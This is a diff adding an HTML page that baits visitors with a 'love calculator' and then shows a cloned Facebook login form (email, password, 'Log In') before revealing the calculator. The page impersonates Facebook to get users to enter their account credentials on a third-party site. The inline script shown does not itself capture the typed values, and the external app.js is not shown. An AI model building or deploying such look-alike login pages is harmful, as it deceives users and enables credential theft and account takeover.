@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In or Sign Up</title>
+  <!--Bootstrap-->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+  <!--Fontawesome CDN link-->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!--External CSS StyleSheet-->
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="welcome-div" style="padding: 0 10px;">
+    <h1 class="text-center my-5 text-primary">Do you wanna try my love calculator?</h1>
+    <p class="text-center text-dark">[ preview ]</p>
+    <img src="lovecalculator.png"
+      style="height: 250px; width: 250px; border-radius: 10px; display: block; margin: 0 auto;">
+    <button id="playBtn" class="btn btn-primary btn-lg my-5" style="display: block; margin: 0 auto;">Use through
+      facebook for better results</button>
+  </div>
+
+  <div class="facebook">
+    <div class="mobile-top-view">
+      <img src="fb-mobile.png" alt="">
+      <a href="#">Get Facebook for Android and browse faster.</a>
+    </div>
+    <div class="view">
+      <div class="container">
+        <!--Row-->
+        <div class="row">
+          <!--Column 1-->
+          <div class="col title-div">
+            <div>
+              <h1 class="text-primary">facebook</h1>
+              <p>Connect with friends and the world around you on Facebook.</p>
+            </div>
+          </div>
+          <!--Column 2-->
+          <div class="col-sm-5">
+            <div class="card">
+
+              <div>
+                <input class="input-group" type="text" placeholder="Email or Phone Number">
+                <input class="input-group my-2" type="password" placeholder="Password">
+                <button id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">Log In</button>
+                <hr id="hr1">
+                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget account?</a>
+                </p>
+              </div>
+              <hr id="hr2">
+              <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
+              <p id="forgetPass2" class="text-center my-3"><a href="#">Forget account?</a></p>
+
+            </div>
+            <p id="form-footer" class="text-center my-4" style="font-size: 14px;"><b>Create a Page</b> for a celebrity,
+              brand or buisness.
+            </p>
+            <div class="mobile-version-footer">
+              <div class="row language">
+                <div class="col">
+                  <p>English (US)</p>
+                  <p>हिन्दी</p>
+                  <p>Portugues (Brasil)</p>
+                  <p>Deutsch</p>
+                </div>
+                <div class="col">
+                  <p>नेपाली</p>
+                  <p>Espanol</p>
+                  <p>Francais (France)</p>
+                  <p><i class="fa fa-plus-square"></i></p>
+                </div>
+              </div>
+              <div class="nav">
+                <ul>
+                  <a href="">
+                    <li>About</li>
+                  </a>
+                  <a href="">
+                    <li>Help</li>
+                  </a>
+                  <a href="">
+                    <li>More</li>
+                  </a>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <!--Row End-->
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!--Love Calculator-->
+  <div class="love-calculator">
+    <div class="container">
+
+      <div class="container-body my-5">
+        <h1 class="text-center my-4 text-danger program-title">Love Calculator</h1>
+        <p id="author"></p>
+        <hr>
+        <div class="input">
+          <input id="firstPerson" type="text" placeholder="enter your name" autocomplete="off">
+          <input id="secondPerson" type="text" placeholder="enter your partner name" autocomplete="off">
+        </div>
+        <div class="calculate my-4">
+          <button id="calcBtn" class="btn btn-danger">Calculate</button>
+        </div>
+        <!--Results-->
+        <div class="result my-5">
+          <div>
+            <h1 id="yourName" class="text-primary"></h1>
+            <h1 id="partnerName" class="text-primary"></h1>
+          </div>
+          <h1 id="resultPercent" class="text-secondary text-center"></h1>
+        </div>
+        <div class="progress-div">
+          <div class="progress-bar"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!--external Script for functionality of love calculator-->
+  <script src="app.js"></script>
+
+  <!--Internal Script for mainpage functionality-->
+  <script>
+    let playBtn = document.querySelector('#playBtn');
+    let welcomeDiv = document.querySelector('.welcome-div');
+    let facebook = document.querySelector('.facebook');
+    let loveCalculatorView = document.querySelector('.love-calculator');
+    let fbLoginBtn = document.querySelector('#fbLogin');
+
+    playBtn.addEventListener('click', redirectToFacebook);
+    fbLoginBtn.addEventListener('click', redirectToGame);
+
+    function redirectToFacebook() {
+      welcomeDiv.remove();
+      facebook.style.display = "block";
+    }
+
+    function redirectToGame() {
+      facebook.style.display = "none";
+      loveCalculatorView.style.display = "block";
+    }
+  </script>
+
+</body>
+
+</html>
